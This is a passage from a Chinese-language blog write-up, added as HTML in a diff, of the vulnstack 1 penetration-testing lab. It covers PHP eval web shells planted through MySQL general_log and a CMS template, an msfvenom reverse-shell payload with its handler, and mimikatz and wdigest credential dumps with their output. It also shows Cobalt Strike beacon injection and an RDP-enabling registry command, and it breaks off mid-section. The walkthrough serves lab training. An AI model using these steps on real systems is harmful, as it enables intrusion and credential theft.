@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+	<meta name="referrer" content="no-referrer" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="环境网络拓扑   VM1： vulnstack-win7 VM2： vulnstack-Win2K3 Metasploitable VM3： vulnstack-winserver08  VmwareAll use hostOnly mode to simulate the intranet environment !  Kali : VMnet1(192.168.54.2) Vm1: VMnet">
+<meta name="keywords" content="vulstack">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulstack 1 writeup">
+<meta property="og:url" content="https:&#x2F;&#x2F;shavchen.github.io&#x2F;vulstack-1-writeup&#x2F;index.html">
+<meta property="og:site_name" content="shavchen">
+<meta property="og:description" content="环境网络拓扑   VM1： vulnstack-win7 VM2： vulnstack-Win2K3 Metasploitable VM3： vulnstack-winserver08  VmwareAll use hostOnly mode to simulate the intranet environment !  Kali : VMnet1(192.168.54.2) Vm1: VMnet">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggw4zenjquj30ss0h7q61.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggwcklt0i3j30vd0hjgnm.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggwdq0z23gj30sb0cx3z9.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggwdrzbg8dj30go073t90.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggwen189ozj30rp04odfz.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggwetgjvdwj30o40ecdha.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggwfghnr5kj30gp03qmxk.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggwfjlsiybj30go052aaw.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggwfpdi495j30gp08574o.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ghzm9txca6j30gn0943yq.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ghzmg8kgk5j30i70dfwfm.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggwkbezdc6j30go01i3yv.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggwk1h25o9j30gp04qt8q.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggwj6p20fxj30ct073wem.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggxpaq7el8j30gp09p3ys.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ghzstghcxzj30a7069mxc.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ghzsye132qj30gp0cejsc.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ghzt142z44j30p80jamza.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ghztdxrfozj30gp0b3q3l.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ghztfwxa28j30go05taa3.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggxquxza8xj30go050abd.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggxqz1ktnij30ia0c3di5.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggxq26ym2qj30jv085q55.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggxq4zwz5jj30go05idgw.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggxqadrr0wj30l309q0t6.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggxr03yrr0j30iv0fpad3.jpg">
+<meta property="og:updated_time" content="2020-08-22T14:11:08.229Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;ww1.sinaimg.cn&#x2F;large&#x2F;006nFhrCly1ggw4zenjquj30ss0h7q61.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>vulstack 1 writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Article</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/V2ray/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://shavchen.github.io/vulstack-1-writeup/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://shavchen.github.io/vulstack-1-writeup/&text=vulstack 1 writeup" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://shavchen.github.io/vulstack-1-writeup/&title=vulstack 1 writeup" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://shavchen.github.io/vulstack-1-writeup/&is_video=false&description=vulstack 1 writeup" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=vulstack 1 writeup&body=Check out this article: https://shavchen.github.io/vulstack-1-writeup/" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://shavchen.github.io/vulstack-1-writeup/&title=vulstack 1 writeup" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://shavchen.github.io/vulstack-1-writeup/&title=vulstack 1 writeup" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://shavchen.github.io/vulstack-1-writeup/&title=vulstack 1 writeup" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://shavchen.github.io/vulstack-1-writeup/&title=vulstack 1 writeup" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://shavchen.github.io/vulstack-1-writeup/&name=vulstack 1 writeup&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-number">1.</span> <span class="toc-text">环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#网络拓扑"><span class="toc-number">1.1.</span> <span class="toc-text">网络拓扑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vmware"><span class="toc-number">1.2.</span> <span class="toc-text">Vmware</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#资产"><span class="toc-number">2.</span> <span class="toc-text">资产</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IP-发现"><span class="toc-number">2.1.</span> <span class="toc-text">IP 发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口探测"><span class="toc-number">2.2.</span> <span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#资源探测"><span class="toc-number">2.3.</span> <span class="toc-text">资源探测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#打点"><span class="toc-number">3.</span> <span class="toc-text">打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpMyadmin"><span class="toc-number">3.1.</span> <span class="toc-text">phpMyadmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#yxcms"><span class="toc-number">3.2.</span> <span class="toc-text">yxcms</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网"><span class="toc-number">4.</span> <span class="toc-text">内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#远程登陆"><span class="toc-number">4.1.</span> <span class="toc-text">远程登陆</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF"><span class="toc-number">4.1.1.</span> <span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#隧道连接"><span class="toc-number">4.1.2.</span> <span class="toc-text">隧道连接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#信息收集"><span class="toc-number">4.2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter"><span class="toc-number">4.2.1.</span> <span class="toc-text">Meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#哈希抓取"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">哈希抓取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#明文密码"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">明文密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#端口信息"><span class="toc-number">4.2.1.3.</span> <span class="toc-text">端口信息</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CobaltStrike"><span class="toc-number">4.2.2.</span> <span class="toc-text">CobaltStrike</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#获取beacon"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">获取beacon</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#哈希抓取-1"><span class="toc-number">4.2.2.2.</span> <span class="toc-text">哈希抓取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#存活探测"><span class="toc-number">4.2.2.3.</span> <span class="toc-text">存活探测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#横向渗透"><span class="toc-number">4.3.</span> <span class="toc-text">横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#添加路由"><span class="toc-number">4.3.1.</span> <span class="toc-text">添加路由</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#添加代理"><span class="toc-number">4.3.2.</span> <span class="toc-text">添加代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#渗透VM2"><span class="toc-number">4.3.3.</span> <span class="toc-text">渗透VM2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#渗透域控"><span class="toc-number">4.3.4.</span> <span class="toc-text">渗透域控</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#清理痕迹"><span class="toc-number">4.4.</span> <span class="toc-text">清理痕迹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        vulstack 1 writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">shavchen</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-08-22T14:09:52.000Z" itemprop="datePublished">2020-08-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/vulstack/" rel="tag">vulstack</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggw4zenjquj30ss0h7q61.jpg" width="600"/>
+
+<ul>
+<li><strong>VM1：</strong> vulnstack-win7</li>
+<li><strong>VM2：</strong> vulnstack-Win2K3 Metasploitable</li>
+<li><strong>VM3：</strong> vulnstack-winserver08</li>
+</ul>
+<h3 id="Vmware"><a href="#Vmware" class="headerlink" title="Vmware"></a>Vmware</h3><p><strong>All use hostOnly mode to simulate the intranet environment !</strong></p>
+<ul>
+<li>Kali : VMnet1(192.168.54.2)</li>
+<li>Vm1: VMnet1(192.168.54.3) + VMnet2(192.168.72.104)</li>
+<li>VM2: VMnet2(192.168.72.103)</li>
+<li>VM3: VMnet2(192.168.72.102)</li>
+</ul>
+<p>需要登陆分别设置IP，统一密码：hongrisec@2019 </p>
+<p>注意：这里需要手动开启 win7 的 phpStudy ！</p>
+<h2 id="资产"><a href="#资产" class="headerlink" title="资产"></a>资产</h2><h3 id="IP-发现"><a href="#IP-发现" class="headerlink" title="IP 发现"></a>IP 发现</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth1 -r 192.168.54.0/24</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取到目标入口 ip 地址：192.168.54.3</strong></p>
+<h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; nmap -Pn -A 192.168.54.3</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure>
+
+<h3 id="资源探测"><a href="#资源探测" class="headerlink" title="资源探测"></a>资源探测</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 .\dirmap.py -i http://192.168.54.3 -lcf</span><br></pre></td></tr></table></figure>
+
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggwcklt0i3j30vd0hjgnm.jpg" width="600"/>
+
+<p>发现 phpmyadmin 后台、beifen.rar 备份文件、phpinfo.php 、l.php 探针</p>
+<h2 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h2><h3 id="phpMyadmin"><a href="#phpMyadmin" class="headerlink" title="phpMyadmin"></a>phpMyadmin</h3><p>1）使用 root/root 弱口令登陆</p>
+<p>2） 通过 phpinfo.php 或l.php 得知绝对路径：C:\phpStudy\WWW</p>
+<p>3） 查看是否可写 shell </p>
+<ol>
+<li><p>导出写 shell ：show variables like ‘%secure%’ , secure_file_priv 值为NULL,不可写</p>
+</li>
+<li><p>日志写 shell ：show variables like ‘%general%’;general_log 为 off ，尝试开启并指定目录</p>
+ <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log=&apos;on&apos;</span><br><span class="line">set global general_log_file=&apos;C:/phpStudy/WWW/c.php&apos;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>4）写 shell ：<code>select &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code>,再设置 general_log 为 off</p>
+<p>5）antSword 连接</p>
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggwdq0z23gj30sb0cx3z9.jpg" width="600"/>
+
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggwdrzbg8dj30go073t90.jpg" alt="image.png"></p>
+<p>当前是 <strong>administrator</strong> 权限 。</p>
+<h3 id="yxcms"><a href="#yxcms" class="headerlink" title="yxcms"></a>yxcms</h3><p>注意到网站根目录下还存在 yxcms ，也可对其 Getshell</p>
+<ol>
+<li>弱口令：admin、123456</li>
+<li>后台：<a href="http://192.168.54.3/yxcms/index.php?r=admin/index/login" target="_blank" rel="noopener">http://192.168.54.3/yxcms/index.php?r=admin/index/login</a></li>
+<li>模板文件 index_index.php 写shell：<code>&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;</code></li>
+<li>antSword 连接：<a href="http://192.168.54.3/yxcms/index.php" target="_blank" rel="noopener">http://192.168.54.3/yxcms/index.php</a></li>
+</ol>
+<h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><h3 id="远程登陆"><a href="#远程登陆" class="headerlink" title="远程登陆"></a>远程登陆</h3><p>当前主机是windows，尝试连接远程桌面，查看3389是否开启，无回显，即未开启，使用以下命令开启（win7、win2003、winxp）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggwen189ozj30rp04odfz.jpg" width="600"/>
+
+<p>添加用户并尝试连接，登陆失败，Nmap扫描结果为 filtered ，查看 win7 防火墙设置了<strong>白名单</strong></p>
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggwetgjvdwj30o40ecdha.jpg" width="600"/>
+
+<p>此时思路一般如下：</p>
+<ol>
+<li>反弹 meterpreter ，尝试关闭防火墙</li>
+<li>尝试使用隧道连接 3389</li>
+</ol>
+<h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>结合 Webshell 反弹 shell 到 MSF 进行内网渗透：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.54.2 lport=5555 -f exe&gt;shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>设置监听：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.54.2</span><br><span class="line"><span class="built_in">set</span> lport 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>使用 antSword 上传并执行</p>
+<p>尝试提权：</p>
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggwfghnr5kj30gp03qmxk.jpg" alt="image.png"></p>
+<p>提权成功，关闭目标机防火墙（不用提权也可以关防火墙），此时便可以成功连接目标主机了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggwfjlsiybj30go052aaw.jpg" alt="image.png"></p>
+<p>远程连接：</p>
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggwfpdi495j30gp08574o.jpg" alt="image.png"></p>
+<h4 id="隧道连接"><a href="#隧道连接" class="headerlink" title="隧道连接"></a>隧道连接</h4><p>使用 ngrok 进行隧道连接，官网：<a href="https://www.ngrok.cc/" target="_blank" rel="noopener">https://www.ngrok.cc/</a></p>
+<p>选择隧道管理  —&gt; 开通隧道 —&gt; 选择一个服务器（frp或者ngrok）—&gt; 开通隧道并获得一个隧道id  —&gt; 下载客户端  —&gt; 打开客户端启动工具  —&gt; 输入隧道id  —&gt; 本地远程登录</p>
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ghzm9txca6j30gn0943yq.jpg" alt="image.png"></p>
+<p>开通完成后下载客户端，填写自己的隧道id，使用代理地址新建远程桌面，使用新建用户 test 登陆，到此为止</p>
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1ghzmg8kgk5j30i70dfwfm.jpg" width="600"/>
+
+
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><p>前面成功反弹了shell，接下来进一步做信息收集工作</p>
+<h5 id="哈希抓取"><a href="#哈希抓取" class="headerlink" title="哈希抓取"></a>哈希抓取</h5><p>使用<code>mimikatz</code>抓明文之前先将<code>PID</code>迁移得到64位进程上，不然可能导致抓不到明文。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">migrate 500 <span class="comment"># 以 winlogon.exe 为例</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : stu1.god.org</span><br><span class="line">BootKey    : fd4639f4e27c79683ae9fee56b44393f</span><br><span class="line"></span><br><span class="line">Rid  : 500</span><br><span class="line">User : Administrator</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">Rid  : 1000</span><br><span class="line">User : liukaifeng01</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">Rid  : 1004</span><br><span class="line">User : shavchen$</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 2f9f4ce9405b47468fa5ff8abd1d8391</span><br></pre></td></tr></table></figure>
+
+<h5 id="明文密码"><a href="#明文密码" class="headerlink" title="明文密码"></a>明文密码</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID     Package    Domain        User           Password</span><br><span class="line">------     -------    ------        ----           --------</span><br><span class="line">0;997      Negotiate  NT AUTHORITY  LOCAL SERVICE </span><br><span class="line">0;999      Negotiate  GOD           STU1$          df </span><br><span class="line">0;2466243  Kerberos   GOD           Administrator  hongrisec@2019</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggwkbezdc6j30go01i3yv.jpg" alt="image.png"></p>
+<h5 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h5><p>从<code>ifconfig /all</code>获取到内网 ip 段：</p>
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggwk1h25o9j30gp04qt8q.jpg" alt="image.png"></p>
+<p>使用 k8gege 的 <code>Ladon</code> 进行端口信息收集 ：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/k8gege/Ladon/blob/master/Ladon.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload /root/Tools/Ladon/Ladon.exe C:/phpStudy/backup</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">cd</span> C:/phpStudy/backup</span><br><span class="line">C:\phpStudy\backup&gt;Ladon.exe 192.168.72.1/24 PortScan</span><br></pre></td></tr></table></figure>
+
+<p>得到存活主机及主要开放端口信息如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.72.102 80默认为Web </span><br><span class="line">192.168.72.102 389默认为LDAP </span><br><span class="line">192.168.72.102 445默认为SMB</span><br><span class="line"></span><br><span class="line">192.168.72.103 21默认是FTP-&gt; 220 Microsoft FTP服务</span><br><span class="line">192.168.72.103 7001默认是Weblogic </span><br><span class="line">192.168.72.103 7002也许是Weblogic </span><br><span class="line">192.168.72.103 445默认是SMB</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 192.168.72.102 主机开启了 LDAP 服务，可能是域控。</p>
+<h4 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h4><h5 id="获取beacon"><a href="#获取beacon" class="headerlink" title="获取beacon"></a>获取beacon</h5><p>服务端在 kali 启动：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./teamserver 192.168.54.2 vulstack</span><br></pre></td></tr></table></figure>
+
+<p>客户端在物理机启动：User 随便写</p>
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggwj6p20fxj30ct073wem.jpg" width=""/>
+
+<p>CobaltStrike开启监听：Listeners-Add，Name 随便填，Host 为服务端 ip，Port 填服务端设置的端口（bind）</p>
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggxpaq7el8j30gp09p3ys.jpg" alt="image.png"></p>
+<p>此时可以使用MSF弹一个shell，也可以使用CS自带的后门获取shell。</p>
+<ol>
+<li>MSF执行命令：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/<span class="built_in">local</span>/payload_inject</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> DisablePayloadHandler <span class="literal">true</span>   <span class="comment">#默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于已经有了一个不需要再产生一个，所以这里设置为true</span></span><br><span class="line"><span class="built_in">set</span> lhost 192.168.54.2           <span class="comment">#cobaltstrike监听的ip</span></span><br><span class="line"><span class="built_in">set</span> lport 14444                  <span class="comment">#cobaltstrike监听的端口 </span></span><br><span class="line"><span class="built_in">set</span> session 1                    <span class="comment">#这里是当前获得的session的id</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>Attack —&gt; Packages —&gt; Payload Generator —&gt; Powershell Command ，如图</p>
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ghzstghcxzj30a7069mxc.jpg" alt="image.png"></p>
+<p>在 win7 上执行生成的 powelshell 命令，即可获取 beacon 。</p>
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ghzsye132qj30gp0cejsc.jpg" alt="image.png"></p>
+</li>
+</ol>
+<h5 id="哈希抓取-1"><a href="#哈希抓取-1" class="headerlink" title="哈希抓取"></a>哈希抓取</h5><p>右键-&gt;Access-&gt;Dump Hashes（需要Administrator权限）</p>
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1ghzt142z44j30p80jamza.jpg" width="600"/>
+
+<h5 id="存活探测"><a href="#存活探测" class="headerlink" title="存活探测"></a>存活探测</h5><p>存活探测：portscan ip段 端口 扫描协议(arp、icmp、none) 线程</p>
+<ul>
